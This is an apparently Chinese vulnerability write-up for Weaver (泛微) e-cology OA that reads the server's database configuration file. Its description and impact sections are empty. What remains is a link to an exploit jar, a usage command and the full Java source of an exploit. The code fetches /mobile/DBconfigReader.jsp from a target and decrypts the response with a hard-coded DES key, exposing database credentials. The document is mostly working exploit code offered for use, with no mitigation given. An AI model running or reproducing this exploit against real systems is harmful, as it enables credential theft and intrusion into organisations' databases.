<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>泛微OA 数据库配置文件读取</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p><a href="https://github.com/ianxtianxt/ecologyExp.jar">https://github.com/ianxtianxt/ecologyExp.jar</a></p><p>使用方式：</p><p>jdk 1.8以上，没混淆可以直接看源码</p><p>使用方法：</p><p>java -jar ecologyExp.jar <a href="http://0-sec.org">http://0-sec.org</a></p><p>源代码如下，编译好的在上方github链接里。</p><p>package com.test;<br /><br />import org.apache.http.HttpEntity;<br />import org.apache.http.client.methods.CloseableHttpResponse;<br />import org.apache.http.client.methods.HttpGet;<br />import org.apache.http.impl.client.CloseableHttpClient;<br />import org.apache.http.impl.client.HttpClientBuilder;<br />import org.apache.http.util.EntityUtils;<br /><br />import javax.crypto.Cipher;<br />import javax.crypto.SecretKey;<br />import javax.crypto.SecretKeyFactory;<br />import javax.crypto.spec.DESKeySpec;<br />import java.security.SecureRandom;<br /><br />public class ReadDbConfig {<br />    private final static String DES = "DES";<br />    private final static String key = "1z2x3c4v5b6n";<br /><br />    public static void main(String[] args) throws Exception {<br />        if(args[0]!=null&amp;&amp; args[0].length() !=0){<br />            String url = args[0]+"/mobile/DBconfigReader.jsp";<br />            System.out.println(ReadConfig(url));<br />        }else{<br />            System.err.print("use: java -jar ecologyExp  http://127.0.0.1");<br />        }<br />    }<br /><br />    private static String ReadConfig(String url) throws Exception {<br />        CloseableHttpClient httpClient = HttpClientBuilder.create().build();<br />        HttpGet httpGet = new HttpGet(url);<br />        CloseableHttpResponse response = httpClient.execute(httpGet);<br />        HttpEntity responseEntity = response.getEntity();<br /><br />        byte[] res1 = EntityUtils.toByteArray(responseEntity);<br /><br />        byte[] data = subBytes(res1,10,res1.length-10);<br /><br />        byte [] finaldata =decrypt(data,key.getBytes());<br /><br />        return (new String(finaldata));<br />    }<br /><br />    private static byte[] decrypt(byte[] data, byte[] key) throws Exception {<br /><br />        SecureRandom sr = new SecureRandom();<br />        DESKeySpec dks = new DESKeySpec(key);<br />        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);<br />        SecretKey securekey = keyFactory.generateSecret(dks);<br />        Cipher cipher = Cipher.getInstance(DES);<br />        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);<br /><br />        return cipher.doFinal(data);<br />    }<br /><br />    public static byte[] subBytes(byte[] src, int begin, int count) {<br />        byte[] bs = new byte[count];<br />        System.arraycopy(src, begin, bs, 0, count);<br />        return bs;<br />    }</p></body></html>